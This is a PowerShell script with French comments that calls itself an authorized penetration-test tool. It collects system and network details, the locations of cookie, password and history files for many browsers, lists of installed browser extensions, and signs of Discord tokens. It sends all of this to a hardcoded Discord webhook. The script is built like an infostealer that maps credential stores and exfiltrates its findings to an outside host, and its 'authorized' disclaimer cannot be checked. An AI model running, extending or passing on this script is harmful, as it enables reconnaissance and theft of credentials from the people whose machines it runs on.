# Authorized Security Assessment Script - Navigateurs Complets
# Pour test de pénétration autorisé avec permissions appropriées

param(
    [string]$WebhookURL = "https://discord.com/api/webhooks/1421217593544409291/c0nEd6QBnRKm2TOHN66HySWWFAzHzXgvYUmaenapa4rmnUbkMJMiqt7JSRTZQDZOl4L8"
)

function Get-SystemInformation {
    try {
        $computerInfo = Get-ComputerInfo
        $osInfo = Get-WmiObject -Class Win32_OperatingSystem
        $processorInfo = Get-WmiObject -Class Win32_Processor
        $memoryInfo = Get-WmiObject -Class Win32_PhysicalMemory
        
        $systemData = @{
            "Nom Ordinateur" = $env:COMPUTERNAME
            "Utilisateur" = $env:USERNAME
            "Domaine" = $env:USERDOMAIN
            "Système" = $computerInfo.WindowsProductName
            "Version OS" = $computerInfo.WindowsVersion
            "Architecture" = $computerInfo.OSArchitecture
            "RAM Installée" = "$([math]::Round(($memoryInfo | Measure-Object -Property Capacity -Sum).Sum / 1GB, 2)) GB"
            "Processeur" = $processorInfo.Name
            "Dernier Démarrage" = $osInfo.LastBootUpTime
        }
        
        return $systemData
    }
    catch {
        return @{Erreur = "Impossible d'obtenir les informations système"}
    }
}

function Get-NetworkInformation {
    try {
        $ipConfig = Get-NetIPConfiguration | Select-Object InterfaceAlias, InterfaceIndex, IPv4Address, IPv4DefaultGateway
        $dnsSettings = Get-DnsClientServerAddress -AddressFamily IPv4
        $arpTable = Get-NetNeighbor
        
        $networkData = @{
            "Configuration IP" = ($ipConfig | Out-String).Trim()
            "Serveurs DNS" = ($dnsSettings | Out-String).Trim()
            "Table ARP" = ($arpTable | Out-String).Trim()
        }
        
        return $networkData
    }
    catch {
        return @{Erreur = "Impossible d'obtenir les informations réseau"}
    }
}

function Get-BrowserData {
    try {
        $browserData = @{}
        
        # Chemins des navigateurs
        $browserPaths = @{
            "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
            "Chrome Beta" = "$env:LOCALAPPDATA\Google\Chrome Beta\User Data\Default"
            "Chrome Dev" = "$env:LOCALAPPDATA\Google\Chrome Dev\User Data\Default"
            "Edge" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
            "Edge Beta" = "$env:LOCALAPPDATA\Microsoft\Edge Beta\User Data\Default"
            "Edge Dev" = "$env:LOCALAPPDATA\Microsoft\Edge Dev\User Data\Default"
            "Brave" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
            "Opera" = "$env:APPDATA\Opera Software\Opera Stable"
            "Opera GX" = "$env:APPDATA\Opera Software\Opera GX Stable"
            "Vivaldi" = "$env:LOCALAPPDATA\Vivaldi\User Data\Default"
            "Yandex" = "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data\Default"
            "Firefox" = "$env:APPDATA\Mozilla\Firefox\Profiles"
        }
        
        foreach ($browser in $browserPaths.Keys) {
            $path = $browserPaths[$browser]
            if (Test-Path $path) {
                $dataFound = @()
                
                # Cookies
                $cookiePath = if ($browser -eq "Firefox") {
                    "$path\*.default*\cookies.sqlite"
                } elseif ($browser -like "Opera*") {
                    "$path\cookies.db"
                } else {
                    "$path\Cookies"
                }
                
                if (Get-ChildItem $cookiePath -ErrorAction SilentlyContinue) {
                    $dataFound += "Cookies trouvés"
                }
                
                # Mots de passe
                $loginPath = if ($browser -eq "Firefox") {
                    "$path\*.default*\logins.json"
                } elseif ($browser -like "Opera*") {
                    "$path\Login Data"
                } else {
                    "$path\Login Data"
                }
                
                if (Get-ChildItem $loginPath -ErrorAction SilentlyContinue) {
                    $dataFound += "Données de connexion trouvées"
                }
                
                # Historique
                $historyPath = if ($browser -eq "Firefox") {
                    "$path\*.default*\places.sqlite"
                } elseif ($browser -like "Opera*") {
                    "$path\History"
                } else {
                    "$path\History"
                }
                
                if (Get-ChildItem $historyPath -ErrorAction SilentlyContinue) {
                    $dataFound += "Historique trouvé"
                }
                
                if ($dataFound.Count -gt 0) {
                    $browserData[$browser] = "Chemin: $path | Données: $($dataFound -join ', ')"
                } else {
                    $browserData[$browser] = "Chemin: $path | Aucune donnée identifiée"
                }
            } else {
                $browserData[$browser] = "Chemin: $path | Non installé/chemin introuvable"
            }
        }
        
        return $browserData
    }
    catch {
        return @{Erreur = "Impossible d'obtenir les données des navigateurs"}
    }
}

function Get-BrowserExtensions {
    try {
        $extensionsData = @{}
        
        # Chrome/Chromium based browsers extensions
        $chromeBasedBrowsers = @(
            "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Extensions",
            "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Extensions",
            "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Extensions",
            "$env:LOCALAPPDATA\Vivaldi\User Data\Default\Extensions"
        )
        
        foreach ($path in $chromeBasedBrowsers) {
            if (Test-Path $path) {
                $parentDir = Split-Path $path -Parent
                $browserName = Split-Path $parentDir -Leaf
                $extensions = Get-ChildItem $path -Directory -ErrorAction SilentlyContinue
                
                if ($extensions) {
                    $extensionList = $extensions | ForEach-Object { $_.Name } | Select-Object -First 10
                    $extensionsData["$browserName Extensions"] = "Trouvées: $($extensions.Count) | Échantillon: $($extensionList -join ', ')"
                }
            }
        }
        
        # Firefox extensions
        $firefoxExtensionsPath = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default*\extensions"
        if (Test-Path $firefoxExtensionsPath) {
            $firefoxExts = Get-ChildItem $firefoxExtensionsPath -File -ErrorAction SilentlyContinue
            if ($firefoxExts) {
                $extensionsData["Firefox Extensions"] = "Trouvées: $($firefoxExts.Count)"
            }
        }
        
        return $extensionsData
    }
    catch {
        return @{Erreur = "Impossible d'obtenir les extensions des navigateurs"}
    }
}

function Get-DiscordTokens {
    try {
        $discordPaths = @(
            "$env:APPDATA\Discord\Local Storage\leveldb",
            "$env:APPDATA\discordcanary\Local Storage\leveldb",
            "$env:APPDATA\discordptb\Local Storage\leveldb"
        )
        
        $tokens = @()
        foreach ($path in $discordPaths) {
            if (Test-Path $path) {
                $files = Get-ChildItem -Path $path -Include "*.ldb", "*.log" -Recurse -ErrorAction SilentlyContinue
                foreach ($file in $files) {
                    try {
                        $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
                        # Pattern de token Discord (détection simplifiée)
                        if ($content -match '[\w-]{24}\.[\w-]{6}\.[\w-]{27}') {
                            $tokens += "Potentiel token trouvé dans: $($file.Name)"
                        }
                    }
                    catch {
                        continue
                    }
                }
            }
        }
        
        if ($tokens.Count -eq 0) {
            $tokens = @("Aucun token Discord trouvé")
        }
        
        return @{TokensDiscord = ($tokens | Out-String).Trim()}
    }
    catch {
        return @{Erreur = "Impossible de vérifier les tokens Discord"}
    }
}

function Send-ToWebhook {
    param(
        [string]$WebhookURL,
        [hashtable]$Data
    )
    
    try {
        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        
        $embed = @{
            title = "📊 Rapport d'Évaluation Sécurité - $env:COMPUTERNAME"
            description = "**TEST AUTORISÉ DE PÉNÉTRATION**`nCollecte de données de sécurité"
            color = 15105570 # Orange color
            fields = @()
            timestamp = $timestamp
            footer = @{
                text = "Évaluation Réseau Interne"
            }
        }
        
        foreach ($key in $Data.Keys) {
            $value = if ($Data[$key] -is [hashtable]) {
                ($Data[$key].GetEnumerator() | Where-Object { $_.Value } | ForEach-Object { "$($_.Key): $($_.Value)" }) -join "`n"
            } else {
                $Data[$key]
            }
            
            # Limiter la taille des valeurs pour respecter les limites Discord
            if ($value.Length -gt 1000) {
                $value = $value.Substring(0, 997) + "..."
            }
            
            if ($value -and $value.Trim() -ne "") {
                $embed.fields += @{
                    name = $key
                    value = "```$value```"
                    inline = $false
                }
            }
        }
        
        $payload = @{
            embeds = @($embed)
            username = "Security Assessment Tool"
            avatar_url = "https://cdn.discordapp.com/embed/avatars/0.png"
        }
        
        $json = $payload | ConvertTo-Json -Depth 10
        Invoke-RestMethod -Uri $WebhookURL -Method Post -ContentType "application/json" -Body $json
    }
    catch {
        Write-Error "❌ Échec de l'envoi au webhook: $_"
    }
}

# Execution principale
try {
    Write-Host "🚀 Démarrage de l'évaluation de sécurité autorisée..." -ForegroundColor Green
    
    $collectedData = @{
        "🖥️ Informations Système" = Get-SystemInformation
        "🌐 Informations Réseau" = Get-NetworkInformation
        "🧭 Données Navigateurs" = Get-BrowserData
        "🧩 Extensions Navigateurs" = Get-BrowserExtensions
        "💬 Informations Discord" = Get-DiscordTokens
    }
    
    Write-Host "📦 Données collectées, envoi vers le webhook..." -ForegroundColor Yellow
    
    # Envoi des données au webhook
    Send-ToWebhook -WebhookURL $WebhookURL -Data $collectedData
    
    Write-Host "✅ Évaluation terminée avec succès!" -ForegroundColor Green
    Write-Host "🔐 RAPPEL: Ce script doit uniquement être utilisé dans le cadre de tests de sécurité autorisés." -ForegroundColor Red
    
    # Pause de sécurité avant fermeture
    Start-Sleep -Seconds 2
}
catch {
    Write-Error "⚠️ Erreur durant l'évaluation: $_"
}
